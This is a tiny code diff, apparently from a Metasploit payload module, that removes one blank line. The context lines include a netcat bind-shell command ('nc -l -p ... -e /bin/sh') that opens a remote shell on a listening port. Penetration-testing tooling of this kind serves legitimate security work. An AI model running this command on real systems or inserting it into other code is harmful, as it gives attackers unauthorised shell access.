@@ -47,5 +47,4 @@ module MetasploitModule
   def command_string
     "nc -l -p #{datastore['LPORT']} -e /bin/sh"
   end
-
 end
